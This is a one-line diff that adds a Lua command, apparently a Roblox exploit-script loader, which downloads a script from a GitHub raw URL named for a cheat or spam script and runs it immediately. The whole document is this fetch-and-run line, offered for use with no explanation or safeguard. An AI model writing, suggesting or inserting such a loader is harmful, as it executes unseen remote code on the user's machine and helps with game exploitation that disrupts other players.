@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/hm-corruption-megamind-drop-crazy-skelet-spam5-v262bdlljm17bs.lua"))()
